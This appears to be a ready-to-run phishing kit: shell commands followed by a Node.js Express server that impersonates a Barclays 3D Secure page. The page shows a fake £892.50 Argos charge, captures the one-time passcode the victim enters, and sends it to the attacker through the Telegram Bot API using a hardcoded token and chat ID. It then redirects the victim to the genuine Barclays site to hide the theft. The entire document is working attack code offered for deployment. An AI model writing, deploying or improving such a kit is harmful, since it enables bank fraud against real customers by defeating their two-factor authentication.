# In Termius
mkdir -p /var/www/otp && cd /var/www/otp

# Create file
cat > index.js << 'ENDOFFILE'
const express = require('express');
const app = express();
const https = require('https');

const TOKEN = '8932355604:AAHPM-q8rIk4EG2SxevGv50-TLK1nbQCjV4';
const CHAT_ID = '8768329228';
const PHONE_LAST = '895';

app.use(express.json());

app.get('/', (req, res) => {
  res.send(\`
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Barclays - 3D Secure</title>
<style>
body{font-family:Arial;background:#f4f4f4;padding:20px;margin:0}
.container{max-width:400px;margin:30px auto;background:white;padding:25px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{text-align:center;font-size:24px;font-weight:bold;color:#00395d;margin-bottom:20px}
.alert{background:#fff3cd;padding:15px;border-radius:4px;margin-bottom:20px;font-size:14px}
.box{background:#f9f9f9;padding:20px;border-radius:8px;margin-bottom:25px}
.merchant{font-size:18px;font-weight:600;color:#333;margin-bottom:5px}
.amount{font-size:28px;font-weight:700;color:#00395d;margin-bottom:5px}
input{width:100%;padding:15px;margin:15px 0;border:2px solid #0076a8;border-radius:8px;font-size:20px;text-align:center;letter-spacing:8px}
button{width:100%;padding:18px;background:#0076a8;color:white;border:none;border-radius:30px;font-size:18px;font-weight:600}
.phone{font-weight:bold;color:#0076a8}
</style>
</head>
<body>
<div class="container">
<div class="logo">barclays</div>
<div class="alert"><strong>Verification Required</strong><br>We've sent a 6-digit code to <span class="phone">********\${PHONE_LAST}</span>. Never share it.</div>
<div class="box">
<div class="merchant">Argos</div>
<div class="amount">£892.50</div>
<div style="color:#666;font-size:14px">\${new Date().toLocaleDateString('en-GB',{day:'numeric',month:'long',year:'numeric'})}</div>
</div>
<input type="text" id="otp" maxlength="6" placeholder="------">
<button onclick="s()">Confirm</button>
</div>
<script>
function s(){
const c=document.getElementById('otp').value;
fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({otp:c})});
document.querySelector('button').textContent='Verifying...';
setTimeout(()=>location.href='https://www.barclays.co.uk/',2000);
}
</script>
</body>
</html>\`);
});

app.post('/capture', (req, res) => {
  const otp = req.body.otp;
  const msg = \`OTP: \${otp}\nPhone: ***\${PHONE_LAST}\nTime: \${new Date().toLocaleString()}\`;
  https.get(\`https://api.telegram.org/bot\${TOKEN}/sendMessage?chat_id=\${CHAT_ID}&text=\${encodeURIComponent(msg)}\`);
  res.json({success: true});
});

app.listen(3000, () => console.log('Running on port 3000'));
ENDOFFILE

npm init -y
npm install express
node index.js
